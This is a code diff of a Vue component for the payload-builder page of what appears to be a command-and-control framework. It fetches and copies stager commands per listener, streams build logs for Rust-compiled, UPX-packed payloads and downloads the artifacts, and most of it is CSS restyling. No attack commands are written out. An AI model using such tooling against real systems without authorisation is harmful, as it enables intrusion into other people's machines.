-    if (!form.value.listenerId) return
-    stagerLoading.value = true
-    try {
-        const os = form.value.combinedType.split('_')[0]
-        const res = await request.get('/api/stager', {
-            params: { listener_id: form.value.listenerId, os, host: form.value.lhost }
-        })
-        stagerCommand.value = res.data.command
-    } catch (e) { stagerCommand.value = '' }
-    finally { stagerLoading.value = false }
+  if (!form.value.listenerId) {
+    stagerCommand.value = ''
+    return
+  }
+
+  stagerLoading.value = true
+  try {
+    const os = form.value.combinedType.split('_')[0]
+    const response = await request.get('/api/stager', {
+      params: {
+        listener_id: form.value.listenerId,
+        os,
+        host: form.value.lhost
+      }
+    })
+    stagerCommand.value = response.data.command
+  } catch {
+    stagerCommand.value = ''
+  } finally {
+    stagerLoading.value = false
+  }
 }
 
-const copyStagerCommand = () => {
-    navigator.clipboard.writeText(stagerCommand.value)
-    ElMessage.success('已复制到剪贴板')
+const copyStagerCommand = async () => {
+  if (!stagerCommand.value) return
+  await navigator.clipboard.writeText(stagerCommand.value)
+  ElMessage.success('命令已复制到剪贴板')
 }
 
-// Terminal Logic
-const buildStatusText = ref('准备就绪')
-const buildStage = ref(1)
-const elapsedTime = ref(0)
-let buildTimer = null
+onMounted(async () => {
+  await fetchListenersData()
 
-const onTerminalOpened = () => {
-    elapsedTime.value = 0; buildStage.value = 1; buildStatusText.value = '预检后端环境...'
-    clearInterval(buildTimer); buildTimer = setInterval(() => { elapsedTime.value++ }, 1000)
+  resizeHandler = () => {
+    fitAddon?.fit()
+  }
+  window.addEventListener('resize', resizeHandler)
+})
 
-    xterm = new XTerm({ theme: { background: '#ffffff', foreground: '#1e1b4b', cursor: '#7c3aed' }, fontSize: 13, fontFamily: 'JetBrains Mono', convertEol: true })
-    fitAddon = new FitAddon(); xterm.loadAddon(fitAddon); xterm.open(terminalContainer.value); fitAddon.fit()
-
-    let baseWs = (import.meta.env.VITE_API_BASE_URL || "").replace('http', 'ws') || `${window.location.protocol === 'https:' ? 'wss:' : 'ws:'}//${window.location.host}`
-    const token = localStorage.getItem('cupcake_token')
-    ws = new WebSocket(`${baseWs}/api/build/logs/${currentTaskId.value}?token=${token}`)
-    ws.onmessage = (e) => {
-        const p = JSON.parse(e.data)
-        if (p.type === 'log') { 
-            xterm.writeln(p.content); logBuffer.value.push(p.content.replace(/\u001b\[\d+m/g, '')) 
-            const text = p.content.toLowerCase()
-            if (text.includes("cargo") || text.includes("compiling")) { buildStage.value = 2; buildStatusText.value = '正在静态编译核心...' }
-            else if (text.includes("upx")) { buildStage.value = 3; buildStatusText.value = '壳层压缩中...' }
-        }
-        else if (p.type === 'success') { 
-            xterm.writeln(`\x1b[32m[OK] DONE: ${p.content}\x1b[0m`); downloadArtifact(p.content)
-            buildStatusText.value = '构建成功'; buildStage.value = 4; clearInterval(buildTimer)
-        }
-        else if (p.type === 'error') { xterm.writeln(`\x1b[31m[FAIL] ${p.content}\x1b[0m`); buildStatusText.value = '构建失败'; clearInterval(buildTimer) }
-    }
-}
-const onTerminalClosed = () => { if (ws) ws.close(); if (xterm) xterm.dispose(); isMinimized.value = false; clearInterval(buildTimer); }
-const clearTerminal = () => { xterm?.clear(); logBuffer.value = []; }
-const exportLogs = () => {
-    const b = new Blob([logBuffer.value.join('\n')], { type: 'text/plain' })
-    const a = document.createElement('a')
-    a.href = URL.createObjectURL(b); a.download = `log_${currentTaskId.value.slice(0,8)}.txt`; a.click()
-}
-const downloadArtifact = async (u) => {
-    const res = await request.get(u, { responseType: 'blob' })
-    const a = document.createElement('a')
-    a.href = URL.createObjectURL(res.data); a.download = u.split('/').pop(); a.click()
-}
+onUnmounted(() => {
+  window.removeEventListener('resize', resizeHandler)
+  syncBuildTimer(false)
+  closeBuildSocket()
+  disposeTerminal()
+})
 </script>
 
 <style scoped>
-.payload-page-container { padding: 0; animation: fadeIn 0.6s ease-out; }
-@keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+.payload-shell {
+  flex: 1;
+  min-height: 0;
+  gap: 20px;
+}
 
-.mb-24 { margin-bottom: 24px; }
-.mt-10 { margin-top: 10px; }
-.mt-24 { margin-top: 24px; }
+.payload-toolbar {
+  display: flex;
+  justify-content: flex-end;
+}
 
-/* Panes */
-.glass-panel {
-  background: rgba(255, 255, 255, 0.75);
-  backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-  border: 1px solid rgba(124, 58, 237, 0.08); border-radius: 24px;
-  box-shadow: 0 10px 30px rgba(124, 58, 237, 0.05);
+.payload-toolbar__metrics {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+}
+
+.payload-grid {
+  display: grid;
+  grid-template-columns: minmax(0, 1.45fr) minmax(320px, 0.8fr);
+  gap: 20px;
+  min-height: 0;
+}
+
+.builder-card,
+.sidebar-card {
   padding: 24px;
 }
 
-.panel-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
-.panel-title { font-size: 24px; font-weight: 900; color: #1e1b4b; margin: 0; }
-.purple-text { color: #7c3aed; }
-.panel-sub { font-size: 13px; color: #94a3b8; font-weight: 600; margin-top: 4px; }
-
-/* Platform Grid */
-.platform-grid { display: flex; gap: 20px; }
-.platform-group { flex: 1; background: #f8fafc; border-radius: 16px; padding: 16px; transition: all 0.3s; border: 1px solid transparent; }
-.platform-group.active { background: rgba(124, 58, 237, 0.04); border-color: rgba(124, 58, 237, 0.1); }
-.os-brand { display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 14px; color: #475569; margin-bottom: 12px; }
-:deep(.el-radio-button__inner) { border-radius: 8px !important; margin-right: 8px; font-weight: 700; border: 1px solid #e2e8f0 !important; }
-
-/* Config Box */
-.config-tabs-box { padding: 0; overflow: hidden; }
-.config-header { display: flex; background: #f8fafc; border-bottom: 1px solid rgba(124, 58, 237, 0.05); }
-.tab-btn { flex: 1; text-align: center; padding: 12px; font-size: 13px; font-weight: 800; color: #94a3b8; cursor: pointer; transition: all 0.2s; }
-.tab-btn.active { color: #7c3aed; background: white; }
-
-.config-body { padding: 20px; }
-.mode-info { display: flex; align-items: center; gap: 10px; color: #64748b; font-size: 12px; font-weight: 600; margin-bottom: 20px; }
-.mini-divider { margin: 15px 0; border-color: rgba(124, 58, 237, 0.05); }
-
-.toggle-item { display: flex; align-items: center; justify-content: space-between; }
-.toggle-item .label { font-size: 13px; font-weight: 800; color: #1e1b4b; }
-
-/* Footer */
-.generate-footer { display: flex; justify-content: space-between; align-items: center; }
-.target-chip { display: flex; gap: 8px; font-family: 'JetBrains Mono'; font-size: 12px; }
-.chip-label { color: #94a3b8; font-weight: 700; }
-.huge-generate-btn { padding: 0 40px; height: 50px; font-size: 15px; font-weight: 900; background: #7c3aed !important; border: none !important; border-radius: 16px; box-shadow: 0 10px 25px rgba(124, 58, 237, 0.3); }
-
-/* Stager Column */
-.panel-title.small { font-size: 15px; font-weight: 800; color: #1e1b4b; }
-.stager-content { min-height: 120px; display: flex; align-items: center; justify-content: center; }
-.terminal-mini { background: #0f172a; width: 100%; border-radius: 12px; padding: 16px; position: relative; }
-.term-dots { display: flex; gap: 5px; margin-bottom: 10px; }
-.term-dots span { width: 6px; height: 6px; border-radius: 50%; background: #334155; }
-.terminal-mini pre { margin: 0; white-space: pre-wrap; word-break: break-all; }
-.terminal-mini code { font-family: 'JetBrains Mono'; font-size: 11px; color: #38bdf8; line-height: 1.6; }
-.copy-mini-btn { position: absolute; top: 10px; right: 10px; color: #94a3b8; font-size: 12px; font-weight: 800; }
-.stager-empty { font-size: 12px; color: #cbd5e1; font-weight: 600; text-align: center; }
-
-/* Tips */
-.tips-list { display: flex; flex-direction: column; gap: 20px; }
-.tip-item { display: flex; gap: 12px; }
-.tip-icon { width: 34px; height: 34px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 16px; flex-shrink: 0; }
-.tip-icon.purple { background: rgba(124, 58, 237, 0.1); color: #7c3aed; }
-.tip-icon.green { background: rgba(16, 185, 129, 0.1); color: #10b981; }
-.tip-icon.blue { background: rgba(14, 165, 233, 0.1); color: #0ea5e9; }
-.tip-text { font-size: 12px; line-height: 1.6; color: #475569; font-weight: 500; }
-
-/* global rule to hide dialog overlay when minimized to preserve background ws */
-:global(body.dialog-backdrop-hidden .el-overlay) {
-  display: none !important;
+.panel-head--tight {
+  margin-bottom: 16px;
+}
+.panel-head h3,
+.dialog-header h3 {
+  margin: 0;
+  font-size: 24px;
+  letter-spacing: -0.04em;
 }
 
-/* Terminal Dialog */
-:deep(.terminal-dialog-v2 .el-dialog) { background: #ffffff !important; border-radius: 24px !important; overflow: hidden; box-shadow: 0 20px 50px rgba(124, 58, 237, 0.12) !important; }
-.term-dialog-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background: #ffffff; color: #1e1b4b; border-bottom: 1px solid rgba(124, 58, 237, 0.05); }
-.header-main { display: flex; align-items: center; gap: 12px; font-weight: 800; font-size: 14px; color: #1e1b4b; }
-.spin { animation: spin 2s linear infinite; color: #7c3aed; }
-@keyframes spin { from { rotate: 0deg; } to { rotate: 360deg; } }
-.terminal-body-v3 { padding: 0; background: #ffffff; }
-.term-toolbar-v3 { display: flex; justify-content: space-between; padding: 8px 24px; background: #f8fafc; border-top: 1px solid rgba(124, 58, 237, 0.05); border-bottom: 1px solid rgba(124, 58, 237, 0.05); }
-.status-badge-v3 { font-size: 10px; font-weight: 900; color: #10b981; }
-.terminal-mount-box { height: 430px; padding: 12px; background: #ffffff; }
-.close-btn, .minimize-btn { color: #64748b !important; }
+.payload-form {
+  display: flex;
+  flex-direction: column;
+  gap: 24px;
+}
 
-/* Build Stats Bar */
-.build-stats-bar {
-  display: flex; gap: 16px; padding: 16px 24px;
-  background: #ffffff; border-bottom: 1px solid rgba(124, 58, 237, 0.05);
+.section-block {
+  display: flex;
+  flex-direction: column;
+  gap: 18px;
 }
-.stat-item {
-  flex: 1; display: flex; align-items: center; gap: 12px;
-  background: #f8fafc; padding: 12px 16px; border-radius: 12px;
-}
-.stat-icon {
-  width: 36px; height: 36px; border-radius: 8px;
-  background: rgba(124, 58, 237, 0.1); color: #7c3aed;
-  display: flex; align-items: center; justify-content: center; font-size: 18px;
-}
-.stat-info { display: flex; flex-direction: column; }
-.stat-label { font-size: 10px; font-weight: 800; color: #94a3b8; text-transform: uppercase; }
-.stat-value { font-size: 13px; font-weight: 800; margin-top: 2px; }
 
-/* Visual Pipeline Steps */
-.build-pipeline {
-  display: flex; align-items: center; padding: 16px 32px;
-  background: #ffffff; border-bottom: 1px solid rgba(124, 58, 237, 0.05);
+.section-title {
+  display: flex;
+  align-items: flex-start;
+  gap: 14px;
 }
-.pipe-step {
-  display: flex; align-items: center; gap: 8px;
-  font-size: 12px; font-weight: 800; color: #94a3b8;
-  transition: all 0.3s;
-}
-.pipe-step span {
-  width: 20px; height: 20px; border-radius: 50%;
-  background: #f1f5f9; color: #64748b;
-  display: flex; align-items: center; justify-content: center;
-  font-size: 11px; font-weight: 800; transition: all 0.3s;
-}
-.pipe-line {
-  flex: 1; height: 2px; background: #e2e8f0; margin: 0 12px;
-  transition: all 0.3s;
-}
-.pipe-step.active { color: #7c3aed; }
-.pipe-step.active span { background: rgba(124, 58, 237, 0.1); color: #7c3aed; box-shadow: 0 0 10px rgba(124, 58, 237, 0.2); }
-.pipe-step.done { color: #10b981; }
-.pipe-step.done span { background: rgba(16, 185, 129, 0.1); color: #10b981; }
-.pipe-line.done { background: #10b981; }
 
-/* Bubble */
-.build-bubble-v2 { position: fixed; bottom: 32px; right: 32px; background: #7c3aed; padding: 12px 24px; border-radius: 20px; color: white; display: flex; align-items: center; gap: 12px; cursor: pointer; box-shadow: 0 10px 30px rgba(124, 58, 237, 0.4); z-index: 2000; animation: scaleIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
-.bubble-info { display: flex; flex-direction: column; }
-.bubble-title { font-size: 12px; font-weight: 900; }
-.bubble-id { font-size: 10px; opacity: 0.8; font-family: 'JetBrains Mono'; }
-.pulse { font-size: 20px; animation: pulse 2s infinite; }
-@keyframes pulse { 0% { scale: 1; } 50% { scale: 1.2; } 100% { scale: 1; } }
+.section-index {
+  width: 34px;
+  height: 34px;
+  display: grid;
+  place-items: center;
+  border-radius: 12px;
+  background: var(--surface-muted);
+  color: var(--text-strong);
+  font-size: 12px;
+  font-weight: 800;
+}
+
+.section-title strong {
+  display: block;
+  margin-bottom: 4px;
+  font-size: 15px;
+}
+
+.section-title p {
+  margin: 0;
+  color: var(--text-body);
+  line-height: 1.6;
+  font-size: 13px;
+}
+
+.platform-grid {
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 16px;
+}
+
+.platform-card {
+  padding: 20px;
+  border: 1px solid var(--line-soft);
+  border-radius: 22px;
+  background: var(--surface-soft);
+  text-align: left;
+  cursor: pointer;
+  transition: transform 0.16s ease, border-color 0.16s ease, background 0.16s ease;
+}
+
+.platform-card:hover {
+  transform: translateY(-1px);
+  border-color: var(--line-strong);
+}
+
+.platform-card--active {
+  background: #ffffff;
+  border-color: var(--text-strong);
+  box-shadow: var(--shadow-soft);
+}
+
+.platform-card__head {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 14px;
+}
+
+.platform-card__icon {
+  width: 42px;
+  height: 42px;
+  display: grid;
+  place-items: center;
+  border-radius: 14px;
+  background: var(--surface-muted);
+  font-size: 18px;
+}
+
+.platform-card__head strong,
+.platform-card__head span {
+  display: block;
+}
+
+.platform-card__head span {
+  margin-top: 4px;
+  font-size: 12px;
+  color: var(--text-muted);
+}
+
+.platform-options {
+  width: 100%;
+}
+
+.platform-options :deep(.el-radio-button) {
+  flex: 1;
+}
+
+.platform-options :deep(.el-radio-button__inner) {
+  width: 100%;
+}
+
+.form-grid {
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 18px;
+}
+
+.mode-panel {
+  padding: 22px;
+  border-radius: 24px;
+  background: var(--surface-soft);
+  border: 1px solid var(--line-soft);
+}
+
+.mode-switch {
+  display: grid;
+  grid-template-columns: repeat(2, minmax(0, 1fr));
+  gap: 12px;
+}
+
+.mode-switch__item {
+  padding: 16px 18px;
+  border: 1px solid var(--line-soft);
+  border-radius: 18px;
+  background: rgba(255, 255, 255, 0.82);
+  text-align: left;
+  cursor: pointer;
+}
+
+.mode-switch__item span,
+.mode-switch__item small {
+  display: block;
+}
+
+.mode-switch__item span {
+  font-weight: 800;
+  color: var(--text-strong);
+}
+
+.mode-switch__item small {
+  margin-top: 4px;
+  font-size: 12px;
+  color: var(--text-muted);
+}
+
+.mode-switch__item--active {
+  border-color: var(--text-strong);
+  background: #ffffff;
+}
+
+.mode-note {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 14px 16px;
+  border-radius: 18px;
+  background: rgba(255, 255, 255, 0.8);
+  color: var(--text-body);
+  line-height: 1.6;
+  font-size: 13px;
+}
+
+.option-grid {
+  display: grid;
+  grid-template-columns: repeat(3, minmax(0, 1fr));
+  gap: 14px;
+}
+
+.option-card {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+  padding: 16px;
+  border-radius: 18px;
+  border: 1px solid var(--line-soft);
+  background: rgba(255, 255, 255, 0.9);
+}
+
+.option-card__label {
+  font-size: 11px;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  color: var(--text-muted);
+}
+
+.option-card strong {
+  font-size: 16px;
+}
+
+.build-preview {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 20px;
+  padding-top: 6px;
+  border-top: 1px solid var(--line-soft);
+}
+
+.build-preview__copy {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+.build-preview__label {
+  font-size: 11px;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  font-weight: 700;
+}
+
+.build-preview__value {
+  color: var(--text-strong);
+  font-size: 13px;
+  word-break: break-all;
+}
+
+.generate-btn {
+  min-width: 150px;
+}
+
+.stager-state,
+.tips-stack,
+.status-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+}
+
+.terminal-card {
+  padding: 16px;
+  border-radius: 18px;
+  background: #0f0f10;
+  color: #f2f2f2;
+}
+
+.terminal-card__dots {
+  display: flex;
+  gap: 6px;
+  margin-bottom: 12px;
+}
+
+.terminal-card__dots span {
+  width: 8px;
+  height: 8px;
+  border-radius: 999px;
+  background: rgba(255, 255, 255, 0.26);
+}
+
+.terminal-card code {
+  display: block;
+  line-height: 1.7;
+  word-break: break-all;
+  font-size: 12px;
+  font-family: Consolas, SFMono-Regular, monospace;
+}
+
+.empty-copy {
+  padding: 22px 0 4px;
+  font-size: 13px;
+  color: var(--text-muted);
+  line-height: 1.7;
+}
+
+.sidebar-actions {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+}
+
+.sidebar-button {
+  flex: 1;
+  min-width: 120px;
+}
+
+.tip-row {
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+}
+
+.tip-row__icon {
+  width: 38px;
+  height: 38px;
+  display: grid;
+  place-items: center;
+  border-radius: 14px;
+  background: var(--surface-muted);
+  color: var(--text-strong);
+  flex-shrink: 0;
+}
+
+.tip-row p {
+  margin: 0;
+  font-size: 13px;
+  color: var(--text-body);
+  line-height: 1.7;
+}
+
+.status-grid {
+  display: grid;
+  grid-template-columns: repeat(3, minmax(0, 1fr));
+  gap: 12px;
+}
+
+.status-grid--dialog {
+  grid-template-columns: repeat(4, minmax(0, 1fr));
+}
+
+.status-cell {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+  padding: 14px 16px;
+  border-radius: 18px;
+  background: var(--surface-soft);
+  border: 1px solid var(--line-soft);
+}
+
+.status-cell span {
+  font-size: 11px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+  color: var(--text-muted);
+}
+
+.status-cell strong {
+  font-size: 14px;
+}
+
+.dialog-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: flex-start;
+  gap: 18px;
+}
+
+.dialog-actions {
+  display: flex;
+  gap: 10px;
+}
+
+.dialog-content {
+  display: flex;
+  flex-direction: column;
+  gap: 18px;
+}
+
+.pipeline {
+  display: grid;
+  grid-template-columns: repeat(3, minmax(0, 1fr));
+  gap: 12px;
+}
+
+.pipeline-step {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 14px 16px;
+  border-radius: 18px;
+  background: var(--surface-soft);
+  border: 1px solid var(--line-soft);
+  color: var(--text-muted);
+  font-size: 13px;
+  font-weight: 700;
+}
+
+.pipeline-step__dot {
+  width: 26px;
+  height: 26px;
+  display: grid;
+  place-items: center;
+  border-radius: 999px;
+  background: #ffffff;
+  border: 1px solid var(--line-soft);
+  font-size: 11px;
+}
+
+.pipeline-step--active,
+.pipeline-step--done {
+  color: var(--text-strong);
+}
+
+.pipeline-step--active {
+  border-color: var(--text-strong);
+}
+
+.pipeline-step--active .pipeline-step__dot {
+  background: var(--text-strong);
+  color: #ffffff;
+  border-color: var(--text-strong);
+}
+
+.pipeline-step--done .pipeline-step__dot {
+  border-color: var(--text-strong);
+}
+
+.terminal-toolbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 14px;
+  padding: 0 4px;
+}
+
+.terminal-toolbar span {
+  font-size: 12px;
+  font-weight: 700;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 0.12em;
+}
+
+.terminal-toolbar__actions {
+  display: flex;
+  gap: 10px;
+}
+
+.terminal-wrap {
+  height: 420px;
+  padding: 16px;
+  border-radius: 22px;
+  background: #0f0f10;
+}
+
+.xterm-view {
+  width: 100%;
+  height: 100%;
+}
+
+.build-bubble {
+  position: fixed;
+  right: 28px;
+  bottom: 28px;
+  display: inline-flex;
+  align-items: center;
+  gap: 14px;
+  padding: 14px 18px;
+  border: 0;
+  border-radius: 20px;
+  background: #111111;
+  color: #ffffff;
+  box-shadow: 0 16px 40px rgba(17, 17, 17, 0.18);
+  cursor: pointer;
+  z-index: 2100;
+}
+
+.build-bubble strong,
+.build-bubble span {
+  display: block;
+  text-align: left;
+}
+
+.build-bubble strong {
+  font-size: 13px;
+}
+
+.build-bubble span {
+  margin-top: 4px;
+  font-size: 11px;
+  opacity: 0.72;
+}
+
+.pop-enter-active,
+.pop-leave-active {
+  transition: opacity 0.18s ease, transform 0.18s ease;
+}
+
+.pop-enter-from,
+.pop-leave-to {
+  opacity: 0;
+  transform: translateY(8px);
+}
+
+@media (max-width: 1240px) {
+  .payload-grid {
+    grid-template-columns: 1fr;
+  }
+}
+
+@media (max-width: 900px) {
+  .payload-toolbar__metrics {
+    width: 100%;
+  }
+
+  .platform-grid,
+  .form-grid,
+  .option-grid,
+  .status-grid,
+  .status-grid--dialog,
+  .pipeline {
+    grid-template-columns: 1fr;
+  }
+
+  .build-preview {
+    flex-direction: column;
+    align-items: stretch;
+  }
+
+  .generate-btn,
+  .sidebar-button {
+    width: 100%;
+  }
+}
+
+@media (max-width: 720px) {
+  .payload-toolbar {
+    flex-direction: column;
+    align-items: stretch;
+  }
+
+  .builder-card,
+  .sidebar-card,
+  .terminal-wrap {
+    padding: 18px;
+  }
+
+  .panel-head h3,
+  .dialog-header h3 {
+    font-size: 20px;
+  }
+
+  .mode-switch {
+    grid-template-columns: 1fr;
+  }
+
+  .dialog-header,
+  .terminal-toolbar {
+    flex-direction: column;
+    align-items: flex-start;
+  }
+
+  .build-bubble {
+    left: 14px;
+    right: 14px;
+    bottom: 14px;
+  }
+}
 </style>
